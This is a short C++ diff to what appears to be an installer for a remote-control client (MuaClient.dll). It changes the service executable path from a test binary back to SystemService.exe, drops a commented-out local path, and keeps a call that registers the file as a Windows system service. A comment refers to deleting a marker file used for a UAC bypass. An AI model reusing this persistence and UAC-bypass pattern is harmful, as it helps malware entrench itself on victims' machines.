@@ -67,8 +67,7 @@ int main()
 
 		// 拼接成MuaClient.dll和SystemService.exe的路径
 		wcscat_s(pszMuaClientDllPath, L"\\MuaClient.dll");
-		//wcscat_s(pszSystemServiceExePath, L"\\SystemService.exe");
-		wcscat_s(pszSystemServiceExePath, L"\\TestRunMuaClientDll.exe");
+		wcscat_s(pszSystemServiceExePath, L"\\SystemService.exe");
 
 		// MuaClient.dll和SystemService.exe不在当前目录则退出安装程序
 		if (!(PathFileExists(pszMuaClientDllPath) && PathFileExists(pszSystemServiceExePath))){
@@ -99,7 +98,6 @@ int main()
 
 
 		// 注册系统服务
-		//RegisterSystemService((LPWSTR)L"C:\\Users\\iyzyi\\Desktop\\WINDOWS黑客编程技术详解-配套代码\\用户层\\5\\系统服务\\AutoRun_Service_Test\\Debug\\ServiceTest.exe");
 		RegisterSystemService(pszNewSystemServiceExePath);
 		
 		//删掉这个用于表示BypassUAC的文件
